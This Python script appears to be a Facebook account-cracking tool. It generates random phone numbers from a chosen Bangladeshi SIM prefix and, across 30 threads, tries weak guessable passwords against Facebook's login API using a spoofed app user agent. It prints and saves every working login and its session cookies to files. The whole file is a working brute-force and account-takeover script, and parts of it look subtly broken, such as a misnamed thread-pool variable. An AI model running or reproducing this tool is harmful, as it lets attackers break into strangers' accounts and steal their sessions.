#WRITTEN BY MR.KHAN
#FOLLOW : https://github.com/MR-KHAN-404
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}
"\033[1;31m" /$$   /$$ /$$   /$$  /$$$$$$  /$$   /$$
"\033[1;31m"| $$  /$$/| $$  | $$ /$$__  $$| $$$ | $$
"\033[1;36m"| $$ /$$/ | $$  | $$| $$  \ $$| $$$$| $$
"\033[1;33m"| $$$$$/  | $$$$$$$$| $$$$$$$$| $$ $$ $$
"\033[1;33m"| $$  $$  | $$__  $$| $$__  $$| $$  $$$$
"\033[1;36m"| $$\  $$ | $$  | $$| $$  | $$| $$\  $$$
"\033[1;31m"| $$ \  $$| $$  | $$| $$  | $$| $$ \  $$
"\033[1;31m"|__/  \__/|__/  |__/|__/  |__/|__/  \__/
{warna}--------------------------------------------{B}
 Owner    : {C}MR.KHAN{B}
 Guthub   : MR-KHAN-404
 Facebook : MINHAJ-KHAN
 Version    : 0{C}/{B}0{C}/{B}1{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_KHAN():
    clear()
    os.system('xdg-open https://github.com/MR-KHAN-404')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for uuid in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as KHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            khan.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_KHAN()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/397.0.0.23.404;FBBV/436604027;FBDM/{density=1.75,width=720,height=1517};FBLC/en_GB;FBRV/438375970;FBCR/EE;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 5.3;FBSV/11;FBOP/1;FBCA/arm64-v8a'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/PING-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/PING-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
(Minhaj)